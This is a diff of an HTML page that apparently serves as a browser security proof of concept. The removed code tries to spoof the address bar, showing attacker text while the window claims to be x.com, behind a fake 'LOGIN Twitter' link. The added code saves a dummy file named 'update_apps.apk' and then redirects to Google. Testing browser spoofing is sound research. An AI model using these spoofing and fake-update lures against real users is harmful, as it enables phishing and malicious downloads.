@@ -1,32 +1,76 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>APK Download & Save with Origin Handling</title>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jszip/3.10.1/jszip.min.js"></script>
+<style>
+  body {
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+    font-family: sans-serif;
+    background-color: #f5f5f5;
+  }
+  button {
+    padding: 15px 25px;
+    font-size: 18px;
+    cursor: pointer;
+  }
+</style>
+</head>
+<body>
+
+<button onclick="downloadAndSaveAPK()">Download & Save APK</button>
+
 <script>
-  function next() {
-    // Redirect ke halaman Google setelah pengalihan
-    w.location.replace('https://www.google.com:1234');
-  }
+async function downloadAndSaveAPK() {
+  try {
+    const zip = new JSZip();
 
-  function f() {
-    // Membuka jendela baru
-    w = window.open("");  
-    w.document.write('<h2>This is not x.com!</h2>');  // Tampilkan konten sementara
-    
-    // Mengubah alamat URL ke x.com, address bar berubah
-    w.location = "https://x.com";
+    // Create a dummy APK file content
+    const apkContent = `
+PK
+Fake APK File Content
+AndroidManifest.xml
+classes.dex
+res/layout/activity_main.xml
+END
+`;
 
-    // Menjaga proses load tetap aktif, dan memeriksa lokasi URL
-    i = setInterval(function() {
-      try {
-        // Cek apakah sudah berhasil di redirect ke x.com
-        if (w.location.href === "https://x.com") {
-          // Lanjutkan setelah berhasil, tetapi tetap di x.com
-          w.document.body.innerHTML = "<h2>This is not x.com!</h2>";
-        }
-      } catch (e) {
-        // Jika gagal, redirect ke https://www.google.com:1234
-        clearInterval(i);
-        next();
-      }
-    }, 1);  // Mengecek setiap 1ms
+    // Add it to the zip file (simulating APK content)
+    zip.file('app.apk', apkContent);
+
+    // Generate the ZIP file containing the APK
+    const blob = await zip.generateAsync({ type: "blob" });
+    const url = URL.createObjectURL(blob);
+
+    // Now using the File System Access API to handle Save File Picker
+    const fileHandle = await window.showSaveFilePicker({
+      suggestedName: 'update_apps.apk',
+      types: [{
+        description: 'APK Files',
+        accept: { 'application/vnd.android.package-archive': ['.apk'] }
+      }]
+    });
+
+    const writableStream = await fileHandle.createWritable();
+    await writableStream.write(blob);
+    await writableStream.close();
+
+    console.log("APK file saved successfully!");
+
+    // Redirect to Google after a small delay
+    setTimeout(() => {
+      location.href = "https://google.com";
+    }, 500);
+
+  } catch (err) {
+    console.error("Error during APK download and save:", err);
   }
+}
 </script>
 
-<a href="#" onclick="f()">LOGIN Twitter</a>
+</body>
+</html>
